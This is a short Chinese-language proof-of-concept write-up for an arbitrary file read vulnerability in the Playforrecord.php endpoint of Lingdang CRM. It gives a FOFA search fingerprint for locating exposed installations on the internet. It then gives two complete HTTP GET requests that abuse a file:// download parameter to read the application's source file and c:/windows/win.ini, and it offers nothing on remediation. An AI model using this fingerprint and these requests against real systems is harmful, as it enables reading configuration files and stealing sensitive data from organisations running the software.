# 灵当CRM系统接口Playforrecord接口处存在任意文件读取漏洞

灵当CRM系统接口Playforrecord.php接口处存在任意文件读取漏洞，允许攻击者通过恶意读取系统配置文件，获取敏感信息。

## fofa

```javascript
body="include/js/ldAjax.js"
```

## poc

```javascript
GET /crm/modules/Accounts/Playforrecord.php?download=file:///D:/ldcrm/www/crm/modules/Accounts/Playforrecord.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

```javascript
GET /crm/modules/Accounts/Playforrecord.php?download=file:///c:/windows/win.ini HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```
